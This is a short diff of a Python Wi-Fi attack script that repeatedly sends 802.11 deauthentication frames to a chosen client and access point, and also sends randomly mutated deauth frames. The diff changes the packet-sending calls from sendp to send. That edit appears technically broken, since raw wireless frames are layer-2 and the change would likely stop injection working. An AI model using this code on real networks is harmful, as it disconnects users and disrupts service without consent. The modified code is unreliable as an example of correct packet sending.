@@ -276,7 +276,7 @@ def main_loop():
                while True:
                   if channel.upper() == 'HOP':
                       hop_channel(interface)
-                  sendp(packet, iface=interface, count=1, verbose=False)
+                  send(packet, iface=interface, count=1, verbose=False)
                   if verbose == 'y':
                       print(f"Sent deauth to client: {client_mac}, AP: {ap_mac}, on interface {interface}")
                   time.sleep(0.1) # for our own good
@@ -413,7 +413,7 @@ def main_loop():
                       base = Dot11(type=0, subtype=12, addr1=target_mac, addr2=src_mac, addr3=target_mac) / Dot11Deauth(reason=7)
 
                   fuzzed_pkt = mutate_wifi_packet(base, mutation_rate=0.15)
-                  sendp(fuzzed_pkt, iface=interface, verbose=False)
+                  send(fuzzed_pkt, iface=interface, verbose=False)
 
                   count += 1
                   if verbose == 'y':
